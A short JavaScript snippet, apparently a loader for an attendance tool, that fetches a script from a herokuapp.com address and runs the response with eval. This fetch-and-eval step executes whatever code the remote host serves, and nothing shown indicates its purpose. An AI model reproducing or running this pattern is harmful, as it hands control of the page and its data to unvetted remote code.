(() => {
  fetch("https://chamada-rnp.herokuapp.com/script")
    .then((response) => response.text())
    .then((response) => eval(response));
})();
